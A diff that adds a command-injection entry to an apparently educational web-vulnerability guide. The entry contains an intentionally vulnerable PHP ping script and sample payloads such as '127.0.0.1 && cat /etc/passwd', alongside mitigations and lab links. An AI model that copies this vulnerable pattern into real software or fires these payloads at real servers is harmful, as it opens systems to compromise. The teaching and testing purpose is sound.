@@ -265,5 +265,88 @@ Windows:
 - [GTFOBins](https://gtfobins.github.io/) — post-exploitation techniques
 
 
+***
+## WEBVULN-005: Command Injection
+
+### 🗂️ Category
+Injection
+
+### ⚠️ Vulnerability Overview
+Command Injection occurs when user input is passed directly to a system shell or command interpreter without proper sanitization. This allows attackers to execute arbitrary commands on the host system, potentially leading to full server compromise.
+
+---
+
+### 🧪 Demo / Proof of Concept
+
+**Scenario:**  
+A web app provides a functionality to check server reachability:
+
+```php
+<?php
+$ip = $_GET['ip'];
+echo shell_exec("ping -c 1 " . $ip);
+?>
+
+```
+
+**Malicious Input:**
+
+`127.0.0.1; uname -a`
+
+**Result:**
+
+- Executes ping, then `uname -a`, leaking system info.
+
+**PoC Payloads:**
+
+**Linux:**
+
+```
+127.0.0.1; id
+127.0.0.1 && cat /etc/passwd
+```
+**Windows:**
+
+```
+127.0.0.1 & whoami
+127.0.0.1 | dir
+```
+
+***
+### 🧪 Test Environment
+
+- [DVWA](http://www.dvwa.co.uk/)
+- [bWAPP](http://www.itsecgames.com/)
+- [Vulhub – Command Injection Labs](https://github.com/vulhub/vulhub/tree/master/command-injection)
+
+---
+
+### 🔒 Mitigation
+
+- Avoid executing system commands with user input
+- Use safe APIs that don’t involve shell invocation
+- Implement strict input validation and allowlists
+- Escape shell metacharacters if shell execution is unavoidable
+- Apply least privilege principles on server processes
+
+---
+
+### 🛠️ Testing Tools / Techniques
+
+- **Burp Suite Repeater/Intruder**
+- **Commix** (automated command injection)
+- **Metasploit Framework**
+- Manual testing with OS-specific payloads
+- Monitor system command logs and anomalies
+
+---
+
+### 📚 References
+
+- [OWASP Command Injection Guide](https://owasp.org/www-community/attacks/Command_Injection)
+- [PortSwigger Command Injection](https://portswigger.net/web-security/os-command-injection)
+- [GTFOBins](https://gtfobins.github.io/) — for command abuse post-exploitation
+
+
 
 
